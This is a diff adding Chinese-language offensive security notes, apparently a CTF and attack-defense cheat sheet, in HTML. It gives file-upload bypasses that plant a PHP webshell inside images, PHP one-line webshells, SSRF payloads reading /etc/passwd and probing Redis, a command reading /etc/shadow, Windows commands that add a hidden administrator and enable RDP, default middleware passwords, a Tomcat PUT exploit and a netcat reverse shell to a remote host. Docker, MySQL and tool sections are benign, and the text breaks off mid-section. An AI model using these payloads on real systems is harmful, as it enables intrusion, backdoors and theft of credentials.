+1、在点击上传文件之前，首先F12打开源代码文件，将上传按钮中关于上传文件格式检查的函数取消，
+这样可以绕过文件类检查，将目标文件上传至网站中。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/cancelcheck.png&quot; alt=&quot;cancelcheck.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 5:&lt;/span&gt; 取消文件名称检查&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+2、将可利用的代码写至图片文件中，依然使用图片文件后缀名文件进行上传文件，在点击上传的同时开启burp suite进行数据抓包操作，将抓到的数据包中将文件名的后缀改成php等服务器可以识别的文件名，这样就可以使用菜刀等软件实现攻击网站的目地。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/modname.png&quot; alt=&quot;modname.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 6:&lt;/span&gt; 使用ubrp suite进行文件名称修改&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;p&gt;
+3、将可利用代码写至图片中的方法
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+cat caidao.php &amp;gt;&amp;gt; caidao.jpg //Windows
+copy /b caidao.php+caidao.jpg caidao.jpg //Linux
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-9-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-9-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;9.2&lt;/span&gt; 文件上传MIME验证&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-9-2&quot;&gt;
+&lt;p&gt;
+修改数据包中Content-Type的值，修改为网站允许的类型后就可以上传文件，对应php中$&lt;sub&gt;file[]的值。&lt;/sub&gt;
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/uploadmime.png&quot; alt=&quot;uploadmime.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 7:&lt;/span&gt; 修改Content-Type值&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-9-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-9-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;9.3&lt;/span&gt; 服务端扩展名验证&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-9-3&quot;&gt;
+&lt;p&gt;
+1、将后缀名进行大小写更改进行尝试
+2、将后缀名添加其它字符进行上传尝试，如:file.php1
+3、白名单无法绕过，Php phtml php3 php5 php7
+4、黑名单，php phtml php5 (.user.ini .htaccess配置文件，改变服务器对文件解析方式，任意文件包含，更改后实时生效）auto&lt;sub&gt;append&lt;/sub&gt;&lt;sub&gt;file包含在文件头部，auto&lt;/sub&gt;&lt;sub&gt;prepend&lt;/sub&gt;&lt;sub&gt;file包含在文件结尾&lt;/sub&gt;
+5、将文件后缀名称之后添加&quot;点空格[. ]&quot;这样可以绕使用windows文件系统特性绕过安全检查
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-9-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-9-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;9.4&lt;/span&gt; 文件内容更改&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-9-4&quot;&gt;
+&lt;p&gt;
+在文件名称及文件类型正常的情况下，我们可以更改文件中的内容从而绕过服务器对上传文件的验证。
+将脚本文件中内容追加到图片中，服务器在验证图片信息时仅仅查看文件的头部信息，对其后面的数据信息并不进行判断，应此我们可以使用此方法将可执行代码上传至服务器。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/uploadneirong.png&quot; alt=&quot;uploadneirong.png&quot;&gt; 
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 8:&lt;/span&gt; 更改文件中内容&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-10&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-10&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;10&lt;/span&gt; CSRF攻击&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-10&quot;&gt;
+&lt;p&gt;
+根据用户修改页面的源码生成一个csrf脚本，当用户点击这个新生成的脚本时，就可以在数据库中更改密码。
+&lt;/p&gt;
+
+
+&lt;div class=&quot;figure&quot;&gt;
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/security/csrf.png&quot; alt=&quot;csrf.png&quot;&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;figure-number&quot;&gt;Figure 9:&lt;/span&gt; csrf攻击脚本&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div id=&quot;outline-container-sec-11&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-11&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;11&lt;/span&gt; SSRF&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-11&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-11-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-11-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;11.1&lt;/span&gt; php&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-11-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+url_init()
+http:://[address]
+file://[127.0.0.1]/etc/passwd
+gopher://   --redis 未授权访问
+dict://127.0.0.1:22  探测端口号
+parse_url:使用file绕过parse_url
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-12&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-12&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;12&lt;/span&gt; 攻防&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-12&quot;&gt;
+&lt;p&gt;
+一、防护
+1、修改已知帐号密码，数据库，windows管理员密码
+2、尽快发现自己的一些漏洞、木马、备份文件，系统安装文件、危险端口如445
+3、实时关注常用服务日志二、攻击
+1、扫描端口、寻找敏感端口，nmap、御剑2014
+2、扫描网站目录，使用御剑
+3、爆破常用服务(21,22,3389.3306,1433)
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-13&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-13&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;13&lt;/span&gt; php相关&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-13&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-13-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-13-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;13.1&lt;/span&gt; 回调函数&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-13-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+call_user_function('system','ls')
+system exec shell_exec passthru popen pcntl_exec
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-13-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-13-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;13.2&lt;/span&gt; php脚本函数执行&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-13-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+&amp;lt;?php  
+$a='a';
+$b='b';
+$c=&quot;$a+${$b}&quot;;
+$e=phpinfo();
+$h=system('cat /etc/shadow');
+$f=&quot;${${system('ls /tmp')}}&quot;
+$d=&quot;${${phpinfo()}}&quot;;
+echo $c;
+?&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-13-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-13-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;13.3&lt;/span&gt; 一句话木马&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-13-3&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+assert($_GET[pass]); //?pass=system('ls')
+$_GET[a](S_GET[b]); //?a=assert&amp;amp;b=phpinfo() ?a=system&amp;amp;b=ls
+$s=$_GET['a']; eval(&quot;\a = \&quot;$a\&quot;;&quot;);
+call_user_function($_GET[a],$_GET[b]); 回调函数
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-14&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-14&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;14&lt;/span&gt; JAVA&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-14&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-14-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-14-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;14.1&lt;/span&gt; 备份&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-14-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+备份源码、数据库
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-14-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-14-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;14.2&lt;/span&gt; 修改口令&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-14-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+系统密码
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-14-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-14-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;14.3&lt;/span&gt; 扫描服务&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-14-3&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+netstat -ano ps -aux nmap -p- x.x.x.x
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-14-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-14-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;14.4&lt;/span&gt; 加固&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-14-4&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+web:
+cms 后台管理修改路径,更改为一个不可攻击的页面
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-14-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-14-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;14.5&lt;/span&gt; struts2&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-14-5&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+057
+052
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-15&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-15&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;15&lt;/span&gt; Docker使用&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-15&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-15-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-15-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;15.1&lt;/span&gt; docker基本命令&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-15-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+docker pull ubuntu 下载镜像
+docker run --name host_name -itd -p 0.0.0.0:80:80 -v /var/www/thml:/root ubuntu bash 创建容器
+docker ps 查看运行中的容器
+docker ps -a 查看所有容器
+docker start/stop/restart [container] 启动/停止/重启
+docker rm -f 删除容器(-f运行中容器)
+docker rmi 删除镜像
+docker save -o test.tar test 打包镜像
+docker load &amp;lt; test.tar 导入镜像
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-15-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-15-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;15.2&lt;/span&gt; docker给运行中的容器添加映射端口&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-15-2&quot;&gt;
+&lt;p&gt;
+1、将容器的8000端口映射到dokcer主机的8001端口
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+docker inspect webapp | grep IPAddress
+iptables -t nat -A DOCKER -p tcp --dport 8001 -j DNAT --to-destination x.x.x.x:8000
+&lt;/pre&gt;
+&lt;p&gt;
+2、方法2
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+docker commit containerid foo/live 提交一个运行中的容器为镜像
+docker run -d -p 8000:80 foo/live /bin/bash 运行镜像并添加端口
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-15-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-15-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;15.3&lt;/span&gt; Docker remote api&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-15-3&quot;&gt;
+&lt;p&gt;
+docker remote api是一个取代远程命令行界面的Rest api。启动docker remote api方式如下:
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678
+&lt;/pre&gt;
+&lt;p&gt;
+执行开机启动
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+#vi /etc/sysconfig/docker
+other_args = &quot; -H unix:///var/run/docker.sock -H tcp://0.0.0.0:5678&quot;
+#service docker restart
+&lt;/pre&gt;
+&lt;p&gt;
+docker验证配置
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+#docker -H localhost:5678 version
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-15-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-15-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;15.4&lt;/span&gt; Dcos&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-15-4&quot;&gt;
+&lt;p&gt;
+dcos自动部署docker软件。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-16&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-16&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;16&lt;/span&gt; Mysql使用&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-16&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-16-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-16-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;16.1&lt;/span&gt; mysql常用命令&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-16-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+show databases; 查看数据库
+show tables; 查看数据库中表
+use database_name; 选择数据库
+select user(); 查看当前用户信息
+select database(); 查看当前数据库
+select schema(); 查看当前数据库
+select user,host,password from mysql.user; 查询信息
+update user set password=password('12') where user='jsf'; 更改密码
+flush privileges; 刷新-更改系统配置之后
+desc table_name;查看表结构
+select 查询
+update 更新
+insert into 插入数据
+delete 删除某条数据
+drop 删除表 删除数据库
+create 新建表 新建数据库
+alter 更改表
+grant 设置用户权限或新建用户 （需要更新权限 flush privileges）
+create database test; 穿件数据库
+grant all privileges on weixin.* to jsf1@'%' identified by '123456'; 创建用户及授权
+grant select on dvwa.* to 'test'@'localhost' identified by 'test'; 分配dvwa数据库查询权限给test用户
+show variables; 查看系统变量
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-16-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-16-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;16.2&lt;/span&gt; sql注入&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-16-2&quot;&gt;
+&lt;p&gt;
+1、空格绕过
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+%0a %0b %a0 %09
+()
+`
++select+user+from`information_schema`.`schmata`where mysql特殊字符后面可以跟关键字
+&lt;/pre&gt;
+&lt;p&gt;
+2、php过滤单引号双引号
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+$id=mysql_real_escape_string($id)
+在sql语句中必须对变量使用引号，否则此过滤失效。
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-17&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-17&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;17&lt;/span&gt; 在信息安全中常用工具&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-17&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-17-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-17-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;17.1&lt;/span&gt; wireshark使用&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-17-1&quot;&gt;
+&lt;p&gt;
+1、wireshark数据包及关键字查询
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+http.request.method==POST &amp;amp;&amp;amp; http contains sgctf
+http.request.method==POST &amp;amp;&amp;amp; http contains ctf
+http.request.method==POST &amp;amp;&amp;amp; http contains flag
+http.request.method==GET &amp;amp;&amp;amp; http contains sgctf
+http.request.method==GET &amp;amp;&amp;amp; http contains ctf
+http.request.method==GET &amp;amp;&amp;amp; http contains flag
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-17-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-17-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;17.2&lt;/span&gt; 查看文件的md5值&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-17-2&quot;&gt;
+&lt;p&gt;
+1、linux系统下
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+md5sum file_name
+&lt;/pre&gt;
+&lt;p&gt;
+2、windows系统下
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+certutil -hashfile filename MD5
+certutil -hashfile filename SHA1
+certutil -hashfile filename SHA256
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-17-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-17-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;17.3&lt;/span&gt; http流量&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-17-3&quot;&gt;
+&lt;p&gt;
+在http流量收集及攻击中我们会用到很多有用的工具如：Burp Suite、arpspoof、driftnet、sslstrip
+等。
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+arpspoof:可以用来在局域网中进行arp攻击
+driftnet:获取数据包中的图片，同时也支持抓取音频文件
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-17-3-1&quot; class=&quot;outline-4&quot;&gt;
+&lt;h4 id=&quot;sec-17-3-1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;17.3.1&lt;/span&gt; http PUT方法&lt;/h4&gt;
+&lt;div class=&quot;outline-text-4&quot; id=&quot;text-17-3-1&quot;&gt;
+&lt;p&gt;
+采用put方法可以上传非法文件及修改文件名称。
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+补丁更新服务关闭(webDAV)
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-17-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-17-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;17.4&lt;/span&gt; 操作系统&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-17-4&quot;&gt;
+&lt;p&gt;
+1、在操作系统方面常用的工具有:nmap、tcpdump、wireshark、zmap、ettercap、metasploit等。
+nmap使用(Winpcap)：
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+nmap -sn ip 开机状态
+nmap -sP ip 通过Ping测试
+nmap -Pn ip 监测全部端口
+nmap -P0 ip 直接进行扫描
+nmap -sN ip 执行tcp空扫描欺骗防火墙
+nmap -p ip 指定端口，多个之间使用逗号隔开
+nmap -O ip 识别远程操作系统
+&lt;/pre&gt;
+&lt;p&gt;
+2、命令行注入利用到的字符串
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+&quot;&amp;amp;&quot; and &quot;&amp;amp;&amp;amp;&quot;
+may be &quot;|&quot; or &quot;||&quot;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-17-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-17-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;17.5&lt;/span&gt; 数据库&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-17-5&quot;&gt;
+&lt;p&gt;
+数据库安全性测试过程中常用工具有sqlmap等
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-17-6&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-17-6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;17.6&lt;/span&gt; 文件分析软件&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-17-6&quot;&gt;
+&lt;p&gt;
+对于非文本文件(jpg)的查看不能使用常用的文本编辑器，而是需要特殊的软件去分析文件中所隐含的信息，如使用hexdump、od我们可以查看到一些有用的信息。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-18&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-18&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;18&lt;/span&gt; 常用中间件管理地址及默认帐号及漏洞利用&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-18&quot;&gt;
+&lt;p&gt;
+以下服务中可以通过默认帐号或者直接上传，我们已经制作好的后门war文件。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-18-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-18-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;18.1&lt;/span&gt; windows常用命令&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-18-1&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+net user add likaikai 123456 /add //添加用户
+net localgroup administrators likaikai /add  //添加到管理员组
+query user //查询在线用户
+logoff id //剔除在线用户，可以登录远程桌面
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f //CMD开启查看3389端口 免重启 开启3389
+start \\192.168.1.136\c$\Windows\ //当攻防时，为防止对方发现自己使用远程登录系统，则可以使用这个命令来访问对方文件
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-18-2&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-18-2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;18.2&lt;/span&gt; Weblogic&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-18-2&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+url: http://localhost:7001/console
+username: weblogic
+password: weblogic123
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-18-3&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-18-3&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;18.3&lt;/span&gt; Tomcat&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-18-3&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+tomcat path:/usr/local/tomcat
+url: http://localhost:8080
+username: admin
+password: 123
+在极端情况下可以删除manager目录，从而web管理界面无法打开，需要重启服务
+
+CVE-2017-12615 tomcat 8.5.19 put 漏洞，由conf/web.xml-&amp;gt;readonly引起，设置为True即可解决问题
+burp中put文件，PUT /jsf.jsp/ HTTP/1.1然后写上文件内容即可。
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-18-4&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-18-4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;18.4&lt;/span&gt; Jboos&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-18-4&quot;&gt;
+&lt;pre class=&quot;example&quot;&gt;
+url: http://localhost:8080
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-18-5&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-18-5&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;18.5&lt;/span&gt; IIS漏洞使用&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-18-5&quot;&gt;
+&lt;p&gt;
+在上传文件中，在文件名称中添加asp/file.jpg后，就可以以php的方式去运行这个jpg文件，这样我们就可以上传后门代码值服务器。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-19&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-19&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;19&lt;/span&gt; 日志分析&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-19&quot;&gt;
+&lt;p&gt;
+查看分析常见操作系统及中间件日志文件，apache日志、IP、时间、请求资源及方式、http状态码，
+tomcat等软件。
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;outline-container-sec-20&quot; class=&quot;outline-2&quot;&gt;
+&lt;h2 id=&quot;sec-20&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;20&lt;/span&gt; 工具使用实验&lt;/h2&gt;
+&lt;div class=&quot;outline-text-2&quot; id=&quot;text-20&quot;&gt;
+&lt;/div&gt;&lt;div id=&quot;outline-container-sec-20-1&quot; class=&quot;outline-3&quot;&gt;
+&lt;h3 id=&quot;sec-20-1&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;20.1&lt;/span&gt; nc软件使用&lt;/h3&gt;
+&lt;div class=&quot;outline-text-3&quot; id=&quot;text-20-1&quot;&gt;
+&lt;p&gt;
+1、Windows nc反弹cmdshell
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+nc -lvp 8080 //本地执行
+nc -e cmd.exe dest_ip 8080 //服务器执行
+&lt;/pre&gt;
+&lt;p&gt;
+2、Linux nc反弹shell
+&lt;/p&gt;
+&lt;pre class=&quot;example&quot;&gt;
+nc -lvp 8080 //本地执行
